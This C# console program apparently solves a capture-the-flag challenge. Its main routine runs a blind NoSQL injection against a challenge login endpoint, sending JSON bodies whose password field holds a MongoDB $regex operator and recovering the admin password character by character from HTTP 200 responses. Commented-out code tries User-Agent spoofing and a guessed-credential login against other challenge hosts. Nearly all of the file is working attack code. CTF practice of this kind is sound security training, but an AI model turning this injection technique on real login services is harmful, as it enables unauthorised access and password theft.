using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;

namespace browser_70
{
    class Program
    {
        private static Uri Miner1 = new Uri(@"http://miners.vuln.icec.tf/");
        private static Uri Miner2 = new Uri(@"http://miners.vuln.icec.tf/login.php");

        static void Main(string[] args)
        {
            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
            var str = client.PostAsync(new Uri(@"http://chainedin.vuln.icec.tf/login"),
                new StringContent("{\"user\":\"admin\",\"pass\":{\"$regex\":\".{55}\"}} ", Encoding.UTF8,
                    "application/json"));

            var chars = Enumerable.Range(0, char.MaxValue + 1)
                      .Select(i => (char)i)
                      .Where(c => !char.IsControl(c))
                      .ToArray();

            Dictionary<int,char> resDictionary = new Dictionary<int, char>();

            string part1 = "{\"user\":\"admin\",\"pass\":{\"$regex\":\"";
            string part2 = ".{";
            string part3 = "}\"}} ";

            for (int i = 0; i < 55; i++)
            {
                int currPos = 54 - i;
                foreach (var c in chars)
                {
                    if (c < 48 || c == 63)
                    {
                        continue;
                    }
                    part1 = part1 + c;

                    var str2 = client.PostAsync(new Uri(@"http://chainedin.vuln.icec.tf/login"),
                        new StringContent(part1 + part2 + currPos + part3,
                            Encoding.UTF8,
                            "application/json"));
                    var res = str2.Result;
                    if (res.StatusCode == HttpStatusCode.OK)
                    {
                        resDictionary.Add(i, c);
                        Console.Write(c);
                        break;
                    }

                    part1 = part1.Substring(0, part1.Length - 1);
                }
            }

            var finalString = resDictionary.Values.ToString();

            var f = str.Result;
            var ff = 1;





            //client.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue(new ProductHeaderValue("miner")));
            //client.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue("SDSLabs", "1"));
            //var str = client.GetStringAsync(new Uri(@"http://hack.bckdr.in/BRWSR/"));
            //var str = client.GetStringAsync(Miner1);
            //var str2 = client.GetStringAsync(Miner2);
            //var result1 = str.Result;
            //var result2 = str2.Result;

            //Mozilla / 3.0(compatible; miner; mailto: miner @miner.com.br)
            

            //var agents2 = agents.Split(new string[] {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries);
            //foreach (var s in agents2)
            //{
            //    /*            //client.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue(new ProductHeaderValue("miner")));
            ////client.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue("SDSLabs", "1"));
            ////var str = client.GetStringAsync(new Uri(@"http://hack.bckdr.in/BRWSR/"));
            //var str = client.GetStringAsync(Miner1);
            //var str2 = client.GetStringAsync(Miner2);
            //var result1 = str.Result;
            //var result2 = str2.Result;*/

            //    try
            //    {
            //        client.DefaultRequestHeaders.UserAgent.Clear();
            //        client.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue(new ProductHeaderValue(s)));
            //        var s1 = client.GetStringAsync(Miner1);
            //        var s2 = client.GetStringAsync(Miner2);//PostAsync(Miner2,
            //        //new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
            //        //{
            //        //    new KeyValuePair<string, string>("username", "admin"),
            //        //    new KeyValuePair<string, string>("password", "12")
            //        //}));
            //        var r1 = s1.Result;
            //        var r2 = s2.Result;

            //        if (r1 != result1 || r2 != result2)
            //        {
            //            var f = 1;
            //        }
            //    }
            //    catch (Exception e)
            //    {
            //        Console.WriteLine(e);
            //    }
            //}
            //Console.WriteLine(result);
            //Console.ReadLine();
        }
    }
}
